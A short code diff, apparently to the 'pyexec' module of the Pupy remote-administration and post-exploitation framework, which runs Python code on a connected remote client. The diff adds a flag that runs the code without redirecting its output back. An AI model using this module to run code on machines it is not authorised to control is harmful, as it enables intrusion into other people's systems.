@@ -12,6 +12,7 @@ class PythonExec(PupyModule):
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='pyexec', description=self.__doc__)
         self.arg_parser.add_argument('--file', metavar="<path>", completer=path_completer, help="execute code from .py file")
+        self.arg_parser.add_argument('-R', '--no-redirected-stdio', action='store_true', default=False, help="Do not redirect stdio (no output)")
         self.arg_parser.add_argument('-c','--code', metavar='<code string>', help="execute python oneliner code. ex : 'import platform;print platform.uname()'")
 
     def run(self, args):
@@ -25,5 +26,8 @@ class PythonExec(PupyModule):
         else:
             raise PupyModuleError("--code or --file argument is mandatory")
 
-        with redirected_stdo(self):
+        if args.no_redirected_stdio:
             self.client.conn.execute(code+"\n")
+        else:
+            with redirected_stdo(self):
+                self.client.conn.execute(code+"\n")
